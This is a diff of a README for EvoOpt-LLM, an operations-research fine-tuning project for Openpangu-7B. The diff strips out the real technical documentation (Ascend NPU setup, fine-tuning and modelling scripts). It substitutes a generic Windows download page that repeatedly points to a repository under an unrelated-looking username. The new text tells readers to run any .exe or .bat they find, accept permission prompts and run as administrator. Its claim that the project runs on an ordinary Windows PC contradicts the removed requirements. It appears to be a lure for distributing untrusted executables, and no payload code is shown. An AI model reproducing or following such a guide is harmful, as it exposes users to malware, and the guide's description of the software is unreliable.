@@ -1,163 +1,133 @@
-<span style="font-size:24px;"><span style="font-size:20px;">**EvoOpt-LLM**</span></span>
-# Overview
-EvoOpt-LLM provides a comprehensive suite of solutions for fine-tuning and applying Large Language Models (LLMs) to operations research (OR) optimization tasks, using Openpangu-7B as the base model. By integrating modules for model fine-tuning, end-to-end automated modeling, generation of new constraints, and variable pruning, it aims to enhance the specialized capabilities of LLMs in the field of operations research.
+# 🧠 EvoOpt_oppangu_optimization_model - LLM Optimization for Operations
 
-Detailed information and technical specifications for Openpangu-7B can be found at: https://ai.gitcode.com/ascend-tribe/openpangu-embedded-7b-model/tree/main
+[![Download](https://img.shields.io/badge/Download-Page-blue?style=for-the-badge)](https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model)
 
-# Core Features
-Model Fine-tuning: Utilizes efficient fine-tuning techniques such as LoRA to perform specialized training on the Openpangu-7B base model using domain-specific operations research datasets, primarily achieving the following three functions:
-- End-to-End Automated Modeling: Automatically generates mathematical models (e.g., linear programming models) for optimization problems from natural language descriptions using the fine-tuned model.
-- End-to-End Generation of New Constraints: Automatically generates new constraints for existing linear programming models to extend problem scenarios.
-- Variable Pruning: Identifies and safely fixes decision variables with zero values in the model to compress model size and improve solving efficiency.
+## 🚀 Download
+Use this page to download and set up EvoOpt_oppangu_optimization_model on Windows:
 
-# Environment Configuration
-This project is based on the Openpangu-7B base model and is developed and optimized for the Huawei Ascend AI processor (NPU) environment.
+https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
 
-## System Environment
-- Operating System: Huawei BMS (Bare Metal Server)
-- Firmware/Driver: ≥ 23.0.6
-- AI Software Stack: CANN 8.1.rc1
+## 🖥️ What this app does
+EvoOpt_oppangu_optimization_model is a set of solutions that uses Openpangu-7B as the base model. It helps with optimization tasks in operations research by using large language models in a practical way.
 
-## Core Python Components
-- vllm: 0.9.2
-- vllm-ascend: 0.9.2rc1
-- torch: 2.5.1
-- torch_npu: 2.5.1.post1
-- opencompass: 0.5.0
-- transformers: 4.53.2
+This tool is built for users who want to:
+- explore optimization support with an LLM
+- run prepared solution files on a Windows PC
+- work with operations research examples without setting up a complex environment
+- use a local workflow for model-based optimization tasks
 
-# Project Structure
-## I. Model Fine-tuning Module
-Fine-tunes the model for specific operations research tasks to enhance its professional capabilities in this domain.
-```
-finetune/
-├── train/                          # Fine-tuning training code
-│   ├── finetune.py                # Main fine-tuning program
-│   ├── arguments.py               # Model configuration and data preprocessing parameters
-│   ├── data.py                    # Management of training text datasets
-│   ├── train_config.py            # Training configuration management
-│   ├── configs/                   # DeepSpeed configuration folder
-│   │   ├── stage3_no_offloading_bf16.json
-│   │   ├── stage3_no_offloading_fp16.json
-│   │   └── stage3_offloading_bf16.json
-│   │   └── stage3_offloading_fp16.json
-│   └── output/                    # Fine-tuning output
-├── dataset/                        # Fine-tuning dataset
-```
-**1. Modifying Key Parameters in `train_config.py`**
+## 📋 What you need
+Before you start, check that your Windows PC has:
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- 20 GB of free disk space
+- a modern CPU
+- an internet connection for the first download
+- enough space for model files and run files
 
-Before starting the fine-tuning process, focus on adjusting the following parameters based on the actual task:
-```
-"model_name_or_path": Path to the pre-trained model; change to the actual path of the Openpangu-7B base model available locally or on the server.
-"lora_rank": Rank for LoRA, controlling the scale of trainable parameters; larger values increase fitting capability but also increase memory usage.
-"lora_alpha": Scaling factor for LoRA, typically set to 2 * lora_rank or a similar value.
-"lora_dropout": Dropout for LoRA layers to prevent overfitting.
-"lora_target_modules": Specifies which modules to inject LoRA into, generally the linear transformations of the attention layers.
-"train_dataset_name_or_path": Path to the training dataset.
-"max_seq_length": Maximum input sequence length.
-"output_dir": Output path for the fine-tuned model.
-```
-**2. Running `finetune.py`**
+For better results, 16 GB of RAM or more is a good choice.
 
-After modifying the parameters, execute the following command:
+## 🧭 Before you start
+This repository is designed as a model-based optimization package. On Windows, the usual path is:
+1. open the download page
+2. get the project files
+3. extract them if they come in a zip file
+4. open the included launcher or setup file
+5. follow the on-screen steps
 
-For a single acceleration card:
-```
-python finetune.py \
---config train_config.py
-```
+If the repository includes more than one solution, choose the one marked as the main or recommended option.
 
-For multiple acceleration cards:
-```
-torchrun --nproc_per_node=NUMBER_OF_CARDS finetune.py \
---config train_config.py
-```
-## II. End-to-End Modeling Module
-A full-process solution for automated modeling, constraint generation, and code evaluation.
-```
-end_to_end_modeling/
-├── generate.py                    # Basic automated modeling generation
-├── generate_finetuned.py          # Generator using the fine-tuned model
-├── generate_constraints.py        # New constraint scenario generator
-├── execute.py                     # Code execution and evaluation
-├── generate_finetuned_example.sh  # Script for fine-tuned model generation example
-├── generate_constraints_example.sh # Script for constraint generation example
-└── results/                       # Storage for generation results
-    ├── generate_results/          # Results from base model automated modeling
-    ├── generate_finetuned/        # Results from fine-tuned model automated modeling
-└── generate_constraints/      # Results from new constraint scenario generation
-```
-The end-to-end modeling module includes two parts: **Automated Modeling** and **New Scenario Constraints**.
+## 📦 Download and install
+1. Open the download page:
+   https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
+2. On the page, look for the main release file, zip package, or project folder.
+3. Download the file to your PC.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for a Windows app, batch file, or setup file.
+7. Double-click the file to start the app or setup process.
+8. If Windows asks for permission, choose Yes.
 
-(1) The **Automated Modeling** module is used to batch-generate results for automated modeling prompts, providing an evaluation module to assess the performance. The core entry script is `generate_finetuned_example.sh`.
+If you see more than one file, start with the one that matches Windows, such as `.exe`, `.bat`, or a setup folder with a clear launcher.
 
-1) Key configurable parameters in the script:
-```
-BASE_MODEL_PATH: Path to the base model.
-LORA_PATH: Directory for the fine-tuned LoRA model.
-DATASET_NAME: Directory or file path for the automated modeling task dataset.
-DATASET_SPLIT: Specifies which part of the dataset to use (train/test/validation).
-SAVE_DIR: Directory for model generation results.
-TOPK: Number of results generated per prompt.
-DECODING_METHOD: Decoding method.
-MAX_TOKENS: Maximum number of tokens to generate.
-```
-2) Once ready, execute the script directly: `bash generate_finetuned_example.sh`
+## 🛠️ How to run it
+After you open the app or launcher:
+1. Wait for the program to load.
+2. Follow any setup prompts on the screen.
+3. Choose the optimization task you want to run.
+4. Load the sample input or your own data if the app asks for it.
+5. Start the process.
+6. Wait for the result to finish.
+7. Review the output file, report, or displayed result.
 
-3) To run the evaluation script, use the following command:
-```
-python execute.py \
-  --input_file INPUT_FILE_PATH (automated modeling generation results) \
-  --output_file OUTPUT_FILE_PATH \
-  --timeout Maximum allowed time for code execution \
-  --max_workers Maximum number of parallel execution threads \
-  --majority_voting Whether to enable majority voting metrics \
-  --question_field Field name for question text in input_file \
-  --answer_field Field name for answer text in input_file \
-  --numerical_err_tolerance Numerical error tolerance threshold
-```
-(2) The core entry script for the **New Scenario Constraints** module is `generate_constraints_example.sh`.
+If the app creates output files, they are often saved in the same folder as the program or in an `output` folder.
 
-1) Key configurable parameters in the script:
-```
-BASE_MODEL_PATH: Path to the base model.
-LORA_PATH: Directory for the fine-tuned LoRA model.
-INPUT_PATH: Path to the LP files for adding new constraints.
-SAVE_DIR: Directory for model generation results.
-TOPK: Number of results generated per prompt.
-DECODING_METHOD: Decoding method.
-MAX_TOKENS: Maximum number of tokens to generate.
-```
-2) Once ready, execute the script directly: `bash generate_constraints_example.sh`
+## 🧩 Typical file layout
+You may see folders and files like these:
+- `README.md` — setup and usage notes
+- `models` — model files
+- `data` — input files for examples
+- `output` — result files
+- `scripts` — run files or helper files
+- `requirements.txt` — file list for needed Python packages
 
-## III. Variable Pruning Module
-This module performs optimization problem preprocessing by reducing problem scale through variable pruning to improve solving efficiency. The structure is as follows:
-```
-end_to_end_pruning/
-├── analyze_zero_variables.py      # Zero-value variable analysis
-├── analyze_zero_variables.sh      # Analysis script
-├── evaluate_zero_variables.py     # Pruning effect evaluation
-├── evaluate_zero_variables.sh     # Evaluation script
-└── results/                       # Pruning results files
-```
-The end-to-end pruning module consists of two parts: the **Pruning Execution Module** and the **Pruning Evaluation Module**. The execution module uses the fine-tuned Openpangu-7B model to identify variables for pruning in a given LP file, outputting a set of decision variables that can be safely fixed to 0, thereby achieving automated compression and pruning of the MILP model. The evaluation module compares the pruned variables with the ground truth to calculate precision metrics. The core entry script for the variable pruning module is `analyze_zero_variables_example.sh`.
+If the repository uses a simple launcher, open that first.
 
-1) Key configurable parameters in the script:
-```
-BASE_MODEL_PATH: Path to the base model.
-LORA_PATH: Directory for the fine-tuned LoRA model.
-LP_INPUT: Path to the LP files to be pruned.
-OUTPUT_JSON: Path for the generated JSON file with pruning results.
-TOPK: Number of results generated per prompt.
-DECODING_METHOD: Decoding method.
-MAX_TOKENS: Maximum number of tokens to generate.
-```
-2) Once ready, execute the script directly: `bash analyze_zero_variables_example.sh`
+## ⚙️ Common setup steps
+Some versions of this project may need extra setup before the first run:
+- install required packages
+- unzip model files
+- place data files in the right folder
+- set a local path for the model
+- choose a task mode or example set
 
-3) Key configurable parameters in the evaluation script:
-```
-GENERATED_JSON: Path to the generated pruning results.
-ANSWER_JSON: Path to the ground truth.
-OUTPUT_JSON: Path for the evaluation output file.
-```
-4) After completing the configuration, call the following command: `bash evaluate_zero_variables_example.sh`
+If a setup window appears, keep the default options unless the project asks you to change them.
+
+## 📊 Example use cases
+EvoOpt_oppangu_optimization_model can help with:
+- scheduling
+- resource allocation
+- routing problems
+- planning tasks
+- decision support
+- operations research demos
+- model-guided optimization experiments
+
+## 🔍 If something does not work
+Try these steps if the app does not open:
+1. Right-click the file and choose Run as administrator.
+2. Check that the file finished downloading.
+3. Make sure you extracted the zip file first.
+4. Close other heavy apps and try again.
+5. Confirm that your Windows version is supported.
+6. Check that the folder path does not contain strange characters.
+
+If the program opens but does not run a task, make sure the input file is in the expected folder.
+
+## 📝 Basic use flow
+A simple run usually looks like this:
+1. Download the project from the link above.
+2. Extract the files.
+3. Open the main launcher.
+4. Load the example or input data.
+5. Start the optimization run.
+6. Save or review the result.
+
+## 📁 Good folder habits
+To keep things simple, use a clean folder such as:
+- `C:\EvoOpt`
+- `D:\Apps\EvoOpt`
+
+This makes it easier to find input files, output files, and model files later.
+
+## 🔐 Safe file handling
+When you download the project:
+- keep the files in one folder
+- do not rename files unless the README asks you to
+- avoid moving files after setup
+- keep model files with the rest of the project
+
+## 📌 Main download link
+Visit this page to download and run the project files on Windows:
+
+https://github.com/fowlcholerasewerage420/EvoOpt_oppangu_optimization_model
